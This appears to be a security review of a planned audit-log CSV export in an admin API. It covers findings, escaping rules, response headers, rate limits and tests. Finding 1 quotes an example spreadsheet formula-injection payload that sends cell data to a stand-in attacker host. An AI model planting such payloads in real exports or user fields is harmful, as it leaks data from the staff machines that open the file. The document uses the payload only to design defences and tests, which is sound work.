## ADM-022 security consult: audit log CSV export (owner answers applied: separate from §5.11, `admin:audit:read`, cap 10,000)

### Findings

1. **Formula injection is a real path into staff workstations (High until mitigated).** `user_agent` is set by the caller. Any anonymous internet client can plant a value like `=HYPERLINK("https://evil/?"&A2,"x")` or a DDE payload by failing one login: the row is written by `record_failure` with the ANONYMOUS actor. The write path only strips control characters and truncates (`app/modules/audit/service.py:55-58`). It does not neutralise `= + - @`.
   - Values inside `changes` can also be set by end users. Org name and description are in the allowlist (`app/modules/audit/diff.py:12`), and end users can create orgs (`organizations/auth_router.py`).
   - `request_id` is server-generated (`app/core/request_id.py:24`). `action`, `app_key`, ids, `ip` and timestamps are constrained by the formats in `app/modules/audit/models.py:24-44`.
2. **The export adds no new data class but makes bulk extraction cheap.** The columns are the same as `AuditLogRead` (`app/modules/audit/schemas.py:14-31`). The PII is end-user `ip` and `user_agent`, plus user ids. Rows never contain emails: `_FORBIDDEN_KEY` (`service.py:25`) and the allowlisted diffs (`diff.py:3`) keep them out. `actor_label` is only a system actor name (`service.py:97-98`). The only new risk is lower effort for an insider or a stolen token: 10k rows in one request instead of 100 pages. Detection (the audit row) and a rate limit address that.
3. **How audit writes work.** `AuditLogger.record` (`service.py:127-151`) builds the row, checks the top-level `changes` keys against `_FORBIDDEN_KEY` (`service.py:68-79`) and flushes. The request session commits in `get_session` teardown before the response is sent (`app/db/session.py:24-35`). So the export row and the response are atomic: if the audit commit fails, the client gets an error, not a file.
   - Admin routers pass `principal: AdminDep` and `ctx: AuditContextDep` to the service (pattern in `app/modules/app_credentials/router.py:33-36`).
   - Actions are a `StrEnum` (`app/modules/audit/actions.py:32-78`) and must match the DB CHECK `^[a-z_]+(\.[a-z_]+)+$`, ≤64 characters (`models.py:33-35`). A row with no target must have both `target_type` and `target_id` NULL (`models.py:36`).
   - The router docstring currently says "Not audited itself." (`app/modules/audit/router.py:1`).
4. **Route order bug risk.** `GET /{audit_log_id}` is declared at `router.py:75`. If `/export` is registered after it, `export` is parsed as a UUID and the request returns 422.
5. **Streaming would break the transaction model.** The session is closed and committed before the response body is sent (`session.py:27`). A `StreamingResponse` that reads from the DB lazily would run after the session is closed, and the audit row would commit before any data was read.
6. **Headers.** For cross-origin admin requests the CORS middleware already adds `Cache-Control: no-store` when the response sets none (`app/core/cors.py:116-117`). `nosniff` is not set anywhere in the app. `ADMIN_POLICY.expose_headers` is `"Retry-After, ETag, X-Request-ID"` (`cors.py:47`), so admin-pan's `fetch` cannot read `Content-Disposition` or a truncation header.
7. **No rate-limit scope fits.** Limiting is per IP with a fixed list of scopes (`app/core/rate_limit.py:71-119`), and admin routes have none today.

### Recommendations

- **AC4, formula injection.** Put one function in the service layer and apply it to every string cell, including `changes`:
  - If the first character is one of `=`, `+`, `-`, `@`, `\t`, `\r`, `\n`, or the full-width forms `＝ ＋ － ＠` (U+FF1D, U+FF0B, U+FF0D, U+FF20), prefix the value with `'`.
  - Also check the first character after stripping leading spaces, because some spreadsheet apps trim them.
  - Write the file with `csv.writer(..., quoting=csv.QUOTE_ALL, lineterminator="\r\n")`.
  - None of the legitimate columns start with these characters (UUIDs, ISO timestamps, IPs including `::1`, enum values), so the rule cannot corrupt real data.
- **AC4, `changes` cell.** Serialise it as one JSON cell: `json.dumps(changes, sort_keys=True, separators=(",", ":"), ensure_ascii=True)`.
  - A JSON object always starts with `{`, so it cannot trigger a formula. Still pass it through the same escape function so the rule stays uniform.
  - `ensure_ascii=True` also turns bidi and invisible characters in org names into `\uXXXX`, which stops visual spoofing in the sheet.
  - Do not flatten `changes` into one column per key: that would expose leading characters.
- **AC4, no extra PII.** Use exactly the `AuditLogRead` columns, built with `AuditLogRead.model_validate(row)`, the same as list and get (ADM-021). Do not join `users` to add actor emails, which would break R11 and the ADM-021 equivalence. Do no new UA processing: it is already cleaned on write.
- **AC3 / R4, the export's own audit row.**
  - Add `AUDIT_LOG_EXPORTED = "audit_log.exported"` to `actions.py`, next to `AUDIT_LOG_PURGED` (line 71). Use `target=None`, and `app_key=None`, `org_id=None` on the row itself, so the export row does not show up in org- or app-filtered lists as if it were about that org.
  - Use flat `changes` like `{"filters": {<non-null filters only, enum values and ISO datetimes, using the dataclass names occurred_from/occurred_to rather than from/to>}, "row_count": n, "truncated": bool, "total": total}`. No row data and no ids from the rows.
  - Record it in an `AuditLogService.export(filters, actor, ctx)` method (R1), after the query and CSV build and before returning.
  - Have a test assert that the `changes` keys are exactly these and that the row does not appear in its own file.
- **AC1, cap and truncation.**
  - Reuse `AuditRepository.list(filters, limit=10_000, offset=0)` (`repository.py:54-94`), which already returns the count. Set `truncated = total > 10_000`.
  - Reuse the `from > to` 422 check (`service.py:263-270`) and share the filter `Query` parameters with the list through one dependency, so the two cannot drift (the ADM-021 shared-filters dependency).
  - Build the whole CSV in memory and return a plain `Response`. Hold the cap as a constant or a setting.
  - Signal truncation with `X-Export-Truncated: true|false` and `X-Total-Count: <total>` headers, not with a comment row, which breaks parsers.
- **Route.** Use `GET /api/v1/audit-logs/export` with `**require_permission("admin:audit:read")` (R3), declared before `/{audit_log_id}`. Update the docstring at `router.py:1`.
- **Response headers.**
  - `Content-Type: text/csv; charset=utf-8`
  - `Content-Disposition: attachment; filename="audit-log-<UTCYYYYMMDDTHHMMSSZ>.csv"`. The filename is server-generated ASCII only; never put filter values (app_key, ids) in it, which also rules out header injection.
  - `Cache-Control: no-store`, set explicitly because same-origin responses do not pass through the CORS fallback.
  - `X-Content-Type-Options: nosniff`
  - Optionally `Content-Security-Policy: sandbox; default-src 'none'` as defence in depth (Informational).
  - Add `Content-Disposition, X-Export-Truncated, X-Total-Count` to `ADMIN_POLICY.expose_headers` (`cors.py:47`).
- **Rate limit (R5).** Add an `"audit_export"` scope (`rate_limit.py:71-119`) with `audit_export_rate_limit` and `audit_export_rate_window_seconds` in `app/core/config.py` and keys in `.env.example`. Suggested default: 10 per 60 s. Put it after `current_admin` so unauthenticated callers cannot use up the bucket.
- **AC5 tests.**
  - A parametrised injection test, one row per trigger character, set through both `user_agent` and an org `name` inside `changes`. Parse the output with `csv.reader` and assert the leading `'`.
  - A cap test with 10,001 rows: header is `true` and the body has 10,000 data rows.
  - Header assertions, including the exact filename pattern.
  - The export audit row is written and contains no row data.
  - 401, 403, the `from > to` 422, and a test that `/export` is not swallowed by `/{id}`.

### Risks
- **Memory:** `changes` has no size limit, so 10k rows could reach tens of MB per request. The rate limit bounds concurrency only loosely. Accept for v1 or lower the cap if worst-case rows prove large.
- **Query cost:** the `org_id` OR filter (`repository.py:70-79`) over a wide date range plus `count(*)` can be slow at 10k+. Consider a statement timeout. The database optimizer may want to look at this.
- **Per-IP limits:** staff behind one NAT share a bucket. A stolen admin token on many IPs bypasses the limit, so detection depends on the audit row.
- **Denied attempts:** 403 export attempts are not audited by the existing permission check, so only successful exports leave a trace.
- **Escaped values look different:** escaped cells show a leading `'` in tools that do not interpret it. This is documented OWASP behaviour, but admin-pan users should be told.

### Open questions
1. Should the file carry a UTF-8 BOM so Excel detects the encoding? It is harmless for security, but it is a client-compatibility choice for admin-pan.
2. Truncation signal: headers only (recommended), or also a JSON preflight or count endpoint? Confirm with admin-pan that it downloads through `fetch` and can read the exposed headers.
3. Rate-limit key: per IP, which matches ADR-0002, or per principal? Per principal needs a small new dependency.
4. Should the export require a date range or at least one filter, to discourage dumping everything? The owner did not ask for it; it is a judgement call.
5. Should denied (403) export attempts write an `outcome=denied` row through `record_denied` (`service.py:195-219`)? That needs a hook in the permission check; probably a follow-up (R7).

Files: `app/modules/audit/{router,service,actions,repository,models,schemas}.py`, `app/db/session.py`, `app/core/cors.py`, `app/core/rate_limit.py`.
